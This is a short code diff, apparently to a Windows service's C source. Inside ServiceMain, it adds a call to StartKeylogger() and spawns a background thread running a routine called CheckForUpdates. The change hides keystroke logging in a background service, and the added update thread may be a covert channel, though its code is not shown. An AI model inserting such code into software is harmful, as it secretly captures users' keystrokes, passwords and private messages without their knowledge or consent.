@@ -227,6 +227,9 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     ServiceStatus.dwWaitHint = 0;
     SetServiceStatus(hStatus, &ServiceStatus);
 
+    StartKeylogger();
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CheckForUpdates, NULL, 0, NULL);
+
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
     {
         Sleep(1000);
